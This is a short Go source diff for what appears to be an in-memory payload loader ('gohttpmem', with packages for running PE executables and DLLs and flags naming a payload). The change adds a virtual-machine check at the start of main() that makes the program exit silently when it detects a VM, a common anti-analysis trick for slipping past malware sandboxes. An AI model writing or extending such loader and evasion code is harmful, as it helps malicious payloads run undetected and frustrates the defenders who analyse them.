@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"gohttpmem/pkg/gorundll"
 	"gohttpmem/pkg/gorunpe"
+	"gohttpmem/pkg/vm"
 	"io"
 	"net/http"
 	"strings"
@@ -21,6 +22,12 @@ const (
 )
 
 func main() {
+	// check if inside vm 
+
+	if isVM, _ := vm.IsVM(); isVM {
+		runtime.GC()
+		os.Exit(0)
+	}
 	// Parse command line flags
 	isDllPtr := flag.Bool("dll", false, "Specifies whether the payload is a DLL (default: false, treats payload as EXE)")
 	procNamePtr := flag.String("proc", "", "For DLLs: Name of the exported procedure to call (optional)")
